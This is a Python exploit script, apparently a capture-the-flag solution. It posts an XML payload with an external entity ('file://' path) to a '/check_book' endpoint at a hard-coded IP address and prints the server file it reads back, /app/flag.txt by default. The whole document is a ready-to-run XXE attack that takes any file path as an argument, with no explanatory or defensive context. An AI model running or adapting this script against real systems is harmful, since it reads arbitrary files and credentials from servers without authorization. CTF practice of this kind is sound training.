#!/usr/bin/env python3

import re
import sys

import requests


DEFAULT_TARGET = "http://31.129.105.124"
DEFAULT_FILE = "/app/flag.txt"


def build_payload(file_path: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<book>
  <id>&xxe;</id>
</book>"""


def extract_result(body: str) -> str:
    match = re.search(r"Результат поиска:\s*(.*)", body, re.DOTALL)
    if match:
        return match.group(1).strip()
    return body.strip()


def main() -> int:
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    file_path = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_FILE

    payload = build_payload(file_path)

    response = requests.post(
        f"{target.rstrip('/')}/check_book",
        data=payload.encode(),
        headers={"Content-Type": "application/xml"},
        timeout=10,
    )
    response.raise_for_status()

    print(extract_result(response.text))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
